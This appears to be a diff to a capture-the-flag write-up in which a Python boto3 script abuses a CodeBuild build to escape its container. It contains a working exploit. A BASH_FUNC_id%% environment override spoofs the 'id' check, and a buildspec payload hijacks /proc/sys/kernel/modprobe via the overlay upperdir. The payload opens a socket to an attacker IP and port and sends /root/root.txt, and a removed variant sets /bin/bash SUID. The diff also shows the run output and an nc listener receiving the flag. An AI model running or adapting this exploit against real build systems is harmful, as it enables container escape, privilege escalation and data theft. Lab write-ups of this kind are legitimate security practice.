@@ -520,29 +520,38 @@ worker@a147090e066a:~$
 ``` python3
 
 import boto3, time
-cb = boto3.client("codebuild", endpoint_url="http://floci:4566", region_name="us-east-1")
-s3 = boto3.client("s3", endpoint_url="http://floci:4566", region_name="us-east-1")
-BUCKET = "loot"
-try:
-    s3.create_bucket(Bucket=BUCKET)
-except Exception:
-    pass
-buildspec = """version: 0.2
+ENDPOINT = "http://floci:4566"
+REGION = "us-east-1"
+ATTACKER_IP = "10.10.14.54"
+LPORT = 9005
+buildspec = f"""version: 0.2
 phases:
   build:
     commands:
       - id
-      - echo "#!/bin/sh" > /tmp/p.sh
-      - echo "chmod u+s /bin/bash" >> /tmp/p.sh
-      - chmod +x /tmp/p.sh
-      - upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
-      - cp /tmp/p.sh "$upper/tmp/p.sh"
-      - echo "|/tmp/p.sh" > /proc/sys/kernel/core_pattern
+      - cat /proc/self/status | grep Cap
+      - |
+        cat > /tmp/payload.sh << 'PYEOF'
+        #!/bin/sh
+        python3 -c "
+        import socket
+        s = socket.socket()
+        s.connect(('{ATTACKER_IP}', {LPORT}))
+        s.send(open('/root/root.txt','rb').read())
+        s.close()
+        "
+        PYEOF
+      - chmod +x /tmp/payload.sh
+      - |
+        upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
+        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
       - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
 """
+cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)
+name = "nimbus-exploit-fixed"
 try:
     cb.create_project(
-        name="nimbus-simple",
+        name=name,
         source={"type": "NO_SOURCE", "buildspec": buildspec},
         artifacts={"type": "NO_ARTIFACTS"},
         environment={
@@ -555,20 +564,53 @@ try:
     )
 except Exception as e:
     print("create_project:", e)
+# CLAVE: el bypass va en start_build como environmentVariablesOverride,
+# NO en create_project como environmentVariables.
 resp = cb.start_build(
-    projectName="nimbus-simple",
+    projectName=name,
     environmentVariablesOverride=[
-        {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
+        {
+            "name": "BASH_FUNC_id%%",
+            "value": "() { echo uid=1000; }",
+            "type": "PLAINTEXT",
+        }
     ],
 )
-print("started:", resp["build"]["id"])
+build_id = resp["build"]["id"]
+print("started:", build_id)
 time.sleep(15)
-# lee directamente el flag desde S3, sin listener
-try:
-    obj = s3.get_object(Bucket=BUCKET, Key="root.txt")
-    print("ROOT.TXT:", obj["Body"].read().decode())
-except Exception as e:
-    print("aún no disponible o error:", e)
+b = cb.batch_get_builds(ids=[build_id])["builds"][0]
+print("status:", b["buildStatus"])
+for phase in b.get("phases", []):
+    if phase.get("phaseType") == "BUILD" and "contexts" in phase:
+        print("  BUILD error:", phase["contexts"])
+print("logs:", b["logs"])
 
 ```
+
+``` bash
+
+worker@ce334573ce4c:~$ python3 exploit_root_fixed.py
+started: nimbus-exploit-fixed:1
+status: FAILED
+  BUILD error: [{'statusCode': 'COMMAND_EXECUTION_ERROR', 'message': "Exit code 127: uid=1000\nCapInh:\t0000000000000000\nCapPrm:\t000001ffffffffff\nCapEff:\t000001ffffffffff\nCapBnd:\t000001ffffffffff\nCapAmb:\t0000000000000000\n/tmp/x: line 1: $'\\377\\377\\377\\377': command not found"}]
+logs: {'groupName': '/aws/codebuild/nimbus-exploit-fixed', 'streamName': '2026/07/11/nimbus-exploit-fixed/1', 'cloudWatchLogsArn': 'arn:aws:logs:us-east-1:847219365028:log-group:/aws/codebuild/nimbus-exploit-fixed:log-stream:2026/07/11/nimbus-exploit-fixed/1'}
+worker@ce334573ce4c:~$
+
+```
+
+``` bash
+
+❯ nc -lvnp 9005
+listening on [any] 9005 ...
+connect to [10.10.14.54] from (UNKNOWN) [10.129.42.106] 35846
+XXXX83242-REDACTED-e1564424XXXX
+╭─ ~                                                                                                   ✔ │ 14s ─╮
+╰─                                                                                                             ─╯
+```
+
+
+
+
+
 
